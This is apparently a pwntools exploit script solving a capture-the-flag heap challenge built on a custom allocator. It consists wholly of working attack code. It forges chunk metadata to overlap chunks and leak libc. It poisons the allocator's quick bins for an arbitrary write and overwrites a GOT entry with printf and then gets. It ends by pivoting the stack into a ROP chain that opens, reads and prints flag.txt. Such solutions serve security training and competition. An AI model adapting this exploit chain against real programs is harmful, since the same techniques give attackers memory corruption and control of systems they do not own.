#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chal_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
libnm = ELF("./libnotmalloc.so")


def start(argv=[], *a, **kw):
    nc = "nc localhost 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def create(idx, size, content):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index > ", str(idx).encode())
    io.sendlineafter(b"size > ", str(size).encode())
    io.sendlineafter(b"content > ", content)


def show(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index > ", str(idx).encode())


def free(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index > ", str(idx).encode())


def chunk_metadata(next_ptr, size, is_free, align=False):
    data = struct.pack("QQQ", next_ptr, size, is_free)
    if align:
        data = data.ljust(size, b"\x00")
    return data


env = {}
io = start()

heap_size = 0x4000
data_heap_size = heap_size // 2
io.sendline(hex(heap_size).encode())
io.sendline(b"2")

# # PoC overlapping data_heap and metadata_heap
# create(0, 0x1000 - 0x20, b"deadbeef")
# show(0)
# pause()
# curr_data_heap_size = 0x1000
# create(1, data_heap_size - curr_data_heap_size, b"cafebabe")
# payload = b""
# payload += chunk_metadata(0, 0x20, 0, True)
# payload += chunk_metadata(0, 0x1000 - 0x20, 0)
# # This allocated chunk would overlap with the metadata_heap
# create(1, 0x40, payload)
# show(0)

create(0, 0x100, b"zero")
create(1, 0x100, b"one")
curr_data_heap_size = 0x20 + 0x100 * 2
create(2, data_heap_size - curr_data_heap_size, b"two")
payload = b""
payload += chunk_metadata(0, 0x20, 0, True)
payload += chunk_metadata(0, 0x100, 0)
# Overwrites metadata of the first two allocaed chunk (allocator info and "zero")  # noqa
create(2, 0x20 + 0x100, payload)
free(0)
payload = chunk_metadata(0, 0x100, 0)
# Chunk overlaps with chunk "one" metadata
create(0, 0x40, payload)
free(1)
show(0)
io.recvuntil(b"content : ")
leak = u64(io.recv(6) + b"\x00\x00")
log.info(f"{leak=:#x}")
libc.address = leak + 0x6fe0
log.info(f"{libc.address=:#x}")
libnm.address = libc.address + 0x228000
log.info(f"{libnm.address=:#x}")
writable = libc.address - 0xb000

leave_ret = libc.address + 0x00133d9a
pop_rdi = libc.address + 0x001bc021
pop_rsi = libc.address + 0x001bb317
pop_rdx_rbx = libc.address + 0x00090529
pop_rax = libc.address + 0x00045eaf
syscall = libc.address + 0x00091396
SYS_READ = 0
SYS_WRITE = 1
SYS_OPEN = 2
ropchain = flat(
    pop_rdi, leak + 0x340,
    pop_rsi, 0,
    pop_rdx_rbx, 0, 0,
    pop_rax, SYS_OPEN,
    syscall,

    pop_rdi, 3,
    pop_rsi, writable + 0x1800,
    pop_rdx_rbx, 0x200, 0,
    pop_rax, SYS_READ,
    syscall,

    pop_rdi, 1,
    pop_rsi, writable + 0x1800,
    pop_rdx_rbx, 0x200, 0,
    pop_rax, SYS_WRITE,
    syscall,
)
create(2, 0x200, ropchain)  # @ leak + 0x140
ropchain_addr = leak + 0x140
# stack_ptr = libc.address + 0x21aa20
# Free the overlapping "one" metadata and allocate the chunk back to gain control of
# the `next` field for abritrary chunk allocation
free(0)
bw_consolidate_got = libnm.got["extend_mapping"] + 0x8
log.info(f"{bw_consolidate_got=:#x}")
quick_bins = libnm.sym["quick_bins"]
log.info(f"{quick_bins=:#x}")
payload = chunk_metadata(quick_bins + data_heap_size, 0x100, 0)  # need to add data_heap_size since it performs get_chunk  # noqa
create(0, 0x40, payload)

create(1, 0x100, b"oldold")
# Use chunk 0x20 to setup for arbitrary write
# Use chunk 0x40 for executing arbitrary write
# Use chunk 0x60 to reset the allocator state
allocator = flat(
    0, 0x10, quick_bins + 0x20 + data_heap_size,  # qb size 0x20
    0, 0x10, bw_consolidate_got + data_heap_size,  # qb size 0x40
    0, 0x10, quick_bins + data_heap_size,  # qb size 0x60
)
create(0, 0x80, b"flag.txt\x00")  # @ leak + 0x340
create(0, 0x100, allocator)
create(0, 0x40, p64(libc.sym["printf"]))
create(0, 0x200, b"%10$llx")
create(1, 0x200, b"a")
free(0)
stack_leak = int(io.recvline(), 16)
log.info(f"{stack_leak=:#x}")

create(0, 0x20, flat(0x10, bw_consolidate_got - 0x50 + data_heap_size))  # get_free_chunk  # noqa
create(0, 0x40, p64(libc.sym["gets"]))


def aaw(addr, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index > ", str(0).encode())
    io.sendlineafter(b"size > ", str(addr).encode())
    time.sleep(0.2)
    io.sendline(data)


aaw(stack_leak, flat(ropchain_addr - 0x8, leave_ret))

# create(0, 0x20, flat(0x10, bw_consolidate_got + data_heap_size))
# create(0, 0x40, p64(libc.sym["printf"]))
# create(0, 0x60, allocator)
# create(0, 0x200, b"%10$llx")
# create(1, 0x200, b"a")
# pause()
# free(0)

io.interactive()
